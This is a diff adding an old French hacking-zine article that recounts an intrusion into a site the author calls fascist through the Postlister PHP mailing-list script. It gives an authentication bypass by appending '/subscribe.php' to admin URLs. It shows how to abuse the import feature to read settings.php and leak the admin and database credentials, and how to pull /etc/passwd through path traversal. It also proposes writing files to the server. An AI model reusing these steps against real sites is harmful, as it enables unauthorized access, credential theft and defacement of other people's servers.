@@ -1,0 +1,117 @@
++-----+---------+----------+-------------------------------+
+| 002 | hacking | An-Mojeg | an-mojeg@mail-developpeur.com |
++-----+---------+----------+-------------------------------+
+
+Hack expliqué + Faille Script PHP Postlister Inédite !!!
+########################################################
+
+Introduction :
+--------------
+	Bon bon bon encore reparti a l'attaque d'un site facho, lors de l'analyse du site 
+une personne dont je ne me rappelle plus le nom (on va l'appeler Henri) m'a informé d'un 
+script non référencé sur le site situé dans /mailing/subscribe.php en s'interrogeant
+sur le fait que la protection du dossier ressemble a une protection par .htaccess mais
+retient certains caractéristiques étrange (il s'agissait donc d'une protection par 
+Authentification http formulée en php), l'identification du script fut simple : postlister
+un script de gestion de mailing liste ... let's go ! Analysons le script !
+
+Analyse de postlister:
+----------------------
+	Tout d'abord reperons la fonction qui nous demande de nous authentifier :
+//-------------------------- functions.php
+...
+
+require("settings.php");
+
+...
+
+if (basename($PHP_SELF) != "subscribe.php" && basename($PHP_SELF) != "confirm.php") {
+    if (!$PHP_AUTH_USER) {
+        header("WWW-Authenticate: Basic realm=\"Postlister\"");
+        header("HTTP/1.0 401 Unauthorized");
+        echo $s62;
+        exit;
+    }
+    else {
+        if ($PHP_AUTH_USER != $username || $PHP_AUTH_PW != $password) {
+            echo $s62;
+            exit;
+        }
+    }
+}
+
+...
+//-------------------------- functions.php
+	hé bé, j'ai rarement vu une authentification aussi facile a déjouer. Si la base de l'url
+est subscribe.php ou confirm.php ya pas de problèmes ? Ben ok ça marche demandons la page index
+de cette manière :
+
+/mailing/index.php/subscribe.php
+
+	Bingo ! ça marche on a la page index maintenant un autre aspect du script m'interresse ...
+La possibilité d'importer et d'exporter des fichiers contenant les adresse des newslists ... tout 
+ça se passe en remote !!! ben là encore ça va pas être très compliqué on va aller sur cette page :
+
+/mailing/import.php/subscribe.php
+(hé oui toujours en contournant la protection)
+	
+	Et on va demander a importer le fichier settings.php ... ça marche !!!
+	On a plus qu'a regarder la liste des adresse mails apartenant a notre liste et là
+hooooo quelle est bizare la liste :
+//##################################################################
+<?php
+
+# PLEASE EDIT THE FOLLOWING VARIABLES:
+#
+
+# Choose a language file:
+$languageFile = "language files/french.php";
+
+# Choose a username for the Postlister administrat
+$username = "admin";
+
+# Choose a password for the Postlister administrat
+$password = "passwd";
+
+# The host on which your database runs. Usually
+# If you don't know what to write here, write
+$databaseHost = "localhost"
+
+# The name of your database:
+$databaseName = "[BLABLABLA]";
+
+# The username for your database:
+$databaseUsername = "[BLABLABLA]";
+
+# The password for your database:
+$databasePassword = "[BLABLABLA]";
+
+# Choose a name for the Postlister main database t
+# The table will be created by Postlister.
+# The name cannot include other characters than a-
+# and 0-9. If you don't know what to write here,
+# just write "postlistermain".
+$mainTable = "postlistermain";
+
+#
+# THAT'S IT!
+#
+?>
+//##################################################################
+	Ben on a les pass maintenant on peut jouer a l'admin en se faisant notre propre newslist haha ! (hum ... ouai)
+	
+	On va maintenant tester l'importation de ../../../../../etc/passwd
+	
+	Je rappelle qu'il faut d'abord créer : la table, si c pas déjà fait et une liste (quand même!)
+La table se crée automatiquement grace au script "table.php" et pour la liste c'est indiqué. Meuh !
+
+	Vous pouvez aussi laisser vos messages sur le serveur en remplissant manuellement la liste
+et en l'exportant vers un fichier txt directement sur le serveur.
+
+Conclusion
+----------
+	!!! w00w00 !!!
+
+An-Mojeg		[ an-mojeg@mail-developpeur.com ]
+
+PS : thank you Henri ;-)
